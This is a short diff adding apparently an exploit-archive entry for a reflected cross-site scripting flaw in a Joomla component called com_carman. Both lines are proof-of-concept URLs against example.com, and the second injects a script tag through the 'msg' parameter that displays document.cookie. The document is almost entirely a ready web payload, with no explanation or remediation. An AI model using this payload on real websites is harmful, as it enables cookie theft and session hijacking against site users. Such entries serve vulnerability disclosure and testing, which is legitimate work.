@@ -1,0 +1,2 @@
+http://www.example.com/index.php?option=com_carman&amp;msg=[XSS CODE]
+http://www.example.com/index.php?option=com_carman&amp;msg=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
